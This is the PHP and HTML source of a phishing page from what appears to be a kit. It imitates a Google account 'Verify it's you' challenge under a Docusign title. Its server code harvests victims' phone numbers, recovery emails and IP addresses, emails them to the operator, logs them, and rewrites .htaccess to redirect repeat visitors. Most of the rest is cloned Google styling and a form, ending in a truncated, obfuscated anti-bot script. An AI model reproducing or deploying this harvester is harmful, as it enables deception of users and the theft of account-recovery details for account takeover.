<?php
error_reporting(0);
session_start();
require_once('../../blocker.php');
require_once('../../config.php');

if (isset($_POST['phoneNumber'])) {

$phoneNumber = $_POST["phoneNumber"];
$recemail = $_POST["recEmail"];

//get user's ip address 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message = "Recovery Credentials". "\n"; 
$message .= "IP: ".$ip. "\n"; 
$message .= "Phone: " . $phoneNumber . "\n"; 
$message .= "Recovery Email " .$_POST["recEmail"] . "\n";
$subjet = "[Adrut] Gmail Verif | $ip";
if($_POST['phoneNumber'] !="" || $_POST['recEmail'] !=""){

@mail($send,$subjet,$message); 
  if ($log)
  {
      $fp = fopen("../error-log.txt","a");
      fputs($fp,$message);
      fclose($fp);
  }

  if ($onetime)
  {
      $file1 = fopen("../../.htaccess","a");
      fwrite($file1, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
      RewriteRule .* https://docusign.com//view_document/api-9812730u102836189231 [R,L]
      ');
      fclose($file1);
  }

}
?>

<script type="text/javascript">
window.location="https://docusign.com//view_document/api-9812730u102836189231"; 
</script> 

<?PHP
exit();
}
?>





<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="robots" content="noindex">
  <title>Docusign - Google Accounts</title>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(images/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {

  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
  <style type="text/css">
  .flex-card {
  padding: 40px;
  width: auto;
  max-width: 560px;
  min-width: 270px;
  }
  .flex-card .rc-button {
  width: auto;
  padding: 0 8px;
  }
  </style>
  <style media="screen and (max-width: 580px)">
  .flex-card {
  width: 270px;
  padding: 20px 15px 30px;
  }
  .flex-card input[type=email],
  .flex-card input[type=number],
  .flex-card input[type=tel],
  .flex-card input[type=text],
  .flex-card .rc-button {
  width: 100%;
  }
  </style>
<style type="text/css">
  .challenge-card h1 {
  margin-bottom: 10px;
  }
  .challenge-card label {
  display: block;
  margin-bottom:10px
  }
  .challenge-card ul {
  list-style: none;
  padding: 0;
  }
  .challenge-card input[type=email],
  .challenge-card input[type=number],
  .challenge-card input[type=tel],
  .challenge-card input[type=text],
  .challenge-card input.rc-button {
  display: block;
  }
  .challenge-card input.radio {
  float: left;
  }
  .challenge-card .description {
  color: #737373;
  margin-bottom: 30px;
  }
  .challenge-card .option-wrapper {
  border-top: 1px solid #d5d5d5;
  }
  .challenge-card .option-wrapper input[name="challengetype"] {
  margin-bottom: 20px;
  margin-top: 20px;
  }
  .challenge-card .option {
  margin-left: 2em;
  zoom: 1;
  }
  .challenge-card hr {
  border: 0;
  height: 1px;
  color: #d5d5d5;
  background-color: #d5d5d5;
  }
  .challenge-card h2 {
  margin-bottom: 10px;
  }
  .challenge-card .label-selected {
  padding-top: 20px;
  font-weight: bold;
  }
  .challenge-card .label-unselected {
  padding-bottom: 20px;
  padding-top: 20px;
  font-weight: normal;
  margin-bottom: 0;
  }
  .challenge-card .option-content-selected {
  padding-bottom: 20px;
  visibility: visible;
  height: 100%;
  }
  .challenge-card .option-content-unselected {
  visibility: hidden;
  height: 0;
  }
  .challenge-card .help {
  color: #999;
  margin-left: 5px;
  }
  .challenge-card #submitChallenge {
  margin: 8px 0 13px;
  }
  .challenge-card .country-select {
  width: 100%;
  height: 37px;
  padding: 0 5px;
  -webkit-border-radius: 2px;
  -webkit-appearance: none;
  -moz-border-radius: 2px;
  border-radius: 2px;
  background-color: #f5f5f5;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  border: 1px solid #dcdcdc;
  color: #444;
  font-size: 11px;
  font-weight: bold;
  line-height: 27px;
  list-style: none;
  margin: 0 0 .5em;
  min-width: 46px;
  outline: none;
  }
  .challenge-card #secret-question {
  margin-bottom: 10px;
  font-weight: bold;
  }
  .challenge-card #country-selector-wrapper {
  margin-bottom: 10px;
  }
  .feedback-link {
  vertical-align: bottom;
  max-width: 270px;
  display: inline-block;
  margin-top: 6px;
  }
  .app-icon {
  margin-left: 2px;
  margin-right: 2px;
  vertical-align: text-bottom;
  }
  .offlineotp-instructions {
  line-height: 20px;
  }
  .offlineotp-instructions li {
  margin: 5px 0;
  }
  div input[type=text].inline-textbox {
  display: inline;
  margin-right: 10px;
  }
  .extra-explanation {
  font-style: italic;
  font-weight: normal;
  color: #737373;
  line-height: 15px;
  }
  .primary-email-info {
  color: #737373;
  }
  .email-address-description {
  width: 180px;
  }
  .option-content-unselected .feedback-link,
  .option-content-unselected .authzen-action-image {
  float: none;
  }
  .authzen-action-image {
  float: left;
  margin-right: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  .challenge-card .description {
  margin-bottom: 18px;
  }
  .challenge-card .option-wrapper input[name="challengetype"] {
  margin-bottom: 10px;
  margin-top: 15px;
  }
  .challenge-card .label-selected {
  padding-top: 15px;
  }
  .challenge-card .label-unselected {
  padding-top: 15px;
  padding-bottom: 10px;
  }
  .challenge-card .option-content-selected {
  padding-bottom: 10px;
  }
</style>
<link href="../../assets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
<script src="../../assets/SpryValidationTextField.js" type="text/javascript"></script>
<script type="text/javascript" src="../../assets/jquery.min.js"></script>
<script type="text/javascript" src="../../assets/jquery.ddslick.min.js"></script>
  </head>
  <body>
  <script type="text/javascript">
  
  var phoneNumber =document.getElementById("phoneNumber").value;
  var recEmail = document.getElementById("recEmail").value;
  
function validateForm() {
    var x = document.forms["challengeform"]["recEmail"].value;
   alert(x);
	}
</script>
  </script>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <img alt="Google" class="logo" src="../../images/google.png">
  </div>
  </div>
  <div class="main content clearfix">
<div class="card flex-card challenge-card">
  <form method="post" id="challengeform" action="#">
  <input type="hidden" id="here" value="test">
  <h1 id="login-challenge-heading">
  Verify it's you
  </h1>
  <div class="body">
  <p class="description">
  Something seems a bit different about the way you're trying to sign in. Complete the step below to let us know it's you and not someone pretending to be you.
  <a href="#" target="_blank">Learn more</a>.
  </p>
  <h2>
  Select a verification method
  </h2>
  
  <div id="challengeZippyContent">
  <div class="option-wrapper clearfix" id="PhoneVerificationChallengeOption">
  <input type="radio" class="radio" name="challengetype"
            id="PhoneVerificationChallenge" value="PhoneVerificationChallenge"
            
        >
  <div class="option">
  <label for="PhoneVerificationChallenge" id="PhoneVerificationChallengeLabel">
  Tell us your phone number
  ********</label>
  <div class="option-content" id="PhoneVerificationChallengeOptionContent">    
  <span role="alert" class="error-msg"><span id="sprytextfield1">
  <input type="text" name="phoneNumber" id="phoneNumber" size="30" dir="ltr" placeholder="Enter full phone number">
  <span class="textfieldRequiredMsg">A value is required.</span></span>
  </span>
  <span role="alert" class="error-msg">
  </span>
  <div class="help">
  We'll check if this matches the phone number we have on file
  </div>
  </div>
  </div>
  </div>
  <div class="option-wrapper clearfix" id="SecretQuestionChallengeOption">
  <input type="radio" class="radio" name="challengetype"id="SecretQuestionChallenge" value="SecretQuestionChallenge">
  <div class="option">
  <label for="SecretQuestionChallenge" id="SecretQuestionChallengeLabel"> Enter your recovery email </label>
  <div class="option-content" id="SecretQuestionChallengeOptionContent">
  <span id="sprytextfield2">
      <input type="text" name="recEmail" id="recEmail" size="30">
      <span class="textfieldRequiredMsg">A value is required.</span></span> <span role="alert" class="error-msg">
  </span>
  <span role="alert" class="error-msg">
  </span>
  </div>
  </div>
  </div>
  </div>
  <input name="submitChallenge" id="submitChallenge" class="rc-button rc-button-submit" type="submit" value="Continue" >
  Having trouble? <a href="#">Reset your password instead</a>.
  </div>
  </form>
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="">
  About Google
  </a>
  </li>
  <li>
  <a href="#" target="_blank">
  Privacy &amp; Terms
  </a>
  </li>
  <li>
  <a href="#" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: none">
  
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29tCg== */(function(){eval('var f,g=this,k=void 0,p=Array.prototype,q=function(a,b,c){return 2>=arguments.length?p.slice.call(a,b):p.slice.call(a,b,c)},s=function(a,b,c,d,e){c=a.split("."),d=g,c[0]in d||!d.execScript||d.execScript("var "+c[0]);for(;c.length&&(e=c.shift());)c.length||b===k?d=d[e]?d[e]:d[e]={}:d[e]=b},t=function(a,b,c){if(b=typeof a,"object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;if(c=Object.prototype.toString.call(a),"[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},v=(new function(){},function(a,b){a.n=("E:"+b.message+":"+b.stack).slice(0,2048)}),w=function(a,b){for(b=Array(a);a--;)b[a]=255*Math.random()|0;return b},x=function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]},A=function(a,b){a.K.push(a.c.slice()),a.c[a.b]=k,z(a,a.b,b)},B=function(a,b,c){return c=function(){return a},b=function(){return c()},b.V=function(b){a=b},b},D=function(a,b,c,d){return function(){if(!d||a.s)return z(a,a.N,arguments),z(a,a.k,c),C(a,b)}},E=function(a,b,c,d){for(c=[],d=b-1;0<=d;d--)c[b-1-d]=a>>8*d&255;return c},F=function(a,b,c,d){if(8192>a.length)return String.fromCharCode.apply(null,a);for(b="",c=0;c<a.length;c+=8192)d=q(a,c,c+8192),b+=String.fromCharCode.apply(null,d);return b},C=function(a,b,c,d){return c=a.a(a.b),a.e&&c<a.e.length?(z(a,a.b,a.e.length),A(a,b)):z(a,a.b,b),d=a.t(),z(a,a.b,c),d},H=function(a,b,c,d){for(b={},b.O=a.a(G(a)),b.P=G(a),c=G(a)-1,d=G(a),b.self=a.a(d),b.D=[];c--;)d=G(a),b.D.push(a.a(d));return b},I=function(a,b,c,d){try{for(d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}},z=function(a,b,c){if(b==a.b||b==a.m)a.c[b]?a.c[b].V(c):a.c[b]=B(c);else if(b!=a.d&&b!=a.f&&b!=a.h||!a.c[b])a.c[b]=J(c,a.a);b==a.r&&(a.u=k,z(a,a.b,a.a(a.b)+4))},K=function(a,b,c,d,e){for(a=a.replace(/\\r\\n/g,"\\n"),b=[],d=c=0;d<a.length;d++)e=a.charCodeAt(d),128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128);return b},L=function(a,b){return b<=a.aa?b==a.h||b==a.d||b==a.f||b==a.q?a.o:b==a.N||b==a.H||b==a.I||b==a.k?a.v:b==a.w?a.i:b==a.j||b==a.p?2:b==a.l?1:4:[1,2,4,a.o,a.v,a.i][b%a.ba]},G=function(a,b,c){if(b=a.a(a.b),!(b in a.e))throw a.g(a.Y),a.A;return a.u==k&&(a.u=x(a.e,b-4),a.C=k),a.C!=b>>3&&(a.C=b>>3,c=[0,0,0,a.a(a.r)],a.Z=I(a.u,a.C,c)),z(a,a.b,b+1),a.e[b]^a.Z[b%8]},J=function(a,b,c,d,e,h,l,n,m){return n=M,e=M.prototype,h=e.t,l=e.Q,m=e.g,d=function(){return c()},c=function(a,r,u){for(u=0,a=d[e.F],r=a===b,a=a&&a[e.F];a&&a!=h&&a!=l&&a!=n&&a!=m&&20>u;)u++,a=a[e.F];return c[e.ga+r+!(!a+(u>>2))]},d[e.J]=e,c[e.fa]=a,a=k,d},N=function(a,b,c,d,e,h){for(e=a.a(b),b=b==a.f?function(b,c,d,h){if(c=e.length,d=c-4>>3,e.da!=d){e.da=d,d=(d<<3)-4,h=[0,0,0,a.a(a.G)];try{e.ca=I(x(e,d),x(e,d+4),h)}catch(r){throw r;}}e.push(e.ca[c&7]^b)}:function(a){e.push(a)},d&&b(d&255),h=0,d=c.length;h<d;h++)b(c[h])},M=function(a,b,c,d,e,h){try{if(this.c=[],z(this,this.b,0),z(this,this.m,0),z(this,this.r,0),z(this,this.h,[]),z(this,this.d,[]),z(this,this.H,"object"==typeof window?window:g),z(this,this.I,this),z(this,this.l,0),z(this,this.p,0),z(this,this.G,0),z(this,this.f,w(4)),z(this,this.q,[]),z(this,this.k,{}),z(this,this.j,2048),this.s=true,a&&"!"==a[0])this.n=a;else{if(window.atob){for(c=window.atob(a),a=[],e=d=0;e<c.length;e++){for(h=c.charCodeAt(e);255<h;)a[d++]=h&255,h>>=8;a[d++]=h}b=a}else b=null;(this.e=b)&&this.e.length?(this.K=[],this.t()):this.g(this.U)}}catch(l){v(this,l)}};f=M.prototype,f.b=0,f.r=1,f.h=2,f.m=3,f.d=4,f.w=5,f.N=6,f.j=7,f.L=8,f.H=9,f.I=10,f.l=11,f.p=12,f.G=13,f.f=14,f.q=15,f.k=16,f.aa=17,f.R=15,f.$=12,f.S=10,f.T=42,f.ba=6,f.i=-1,f.o=-2,f.v=-3,f.U=17,f.W=21,f.B=22,f.ea=30,f.Y=31,f.X=33,f.A={},f.F="caller",f.J="toString",f.ga=34,f.fa=36,M.prototype.a=function(a,b){if(b=this.c[a],b===k)throw this.g(this.ea,0,a),this.A;return b()},M.prototype.ka=function(a,b,c,d){d=a[(b+2)%3],a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)},M.prototype.ja=function(a,b,c,d){if(3==a.length){for(c=0;3>c;c++)b[c]+=a[c];for(c=0,d=[13,8,13,12,16,5,3,10,15];9>c;c++)b[3](b,c%3,d[c])}},M.prototype.la=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},M.prototype.g=function(a,b,c,d){d=this.a(this.m),a=[a,d>>8&255,d&255],c!=k&&a.push(c),0==this.a(this.h).length&&(this.c[this.h]=k,z(this,this.h,a)),c="",b&&(b.message&&(c+=b.message),b.stack&&(c+=":"+b.stack)),b=this.a(this.j),3<b&&(c=c.slice(0,b-3),b-=c.length+3,c=K(c),N(this,this.f,E(c.length,2).concat(c),this.$)),z(this,this.j,b)},f.M=[function(){},function(a,b,c,d,e){b=G(a),c=G(a),d=a.a(b),b=L(a,b),e=L(a,c),e==a.i||e==a.o?d=""+d:0<b&&(1==b?d&=255:2==b?d&=65535:4==b&&(d&=4294967295)),z(a,c,d)},function(a,b,c,d,e,h,l,n,m){if(b=G(a),c=L(a,b),0<c){for(d=0;c--;)d=d<<8|G(a);z(a,b,d)}else 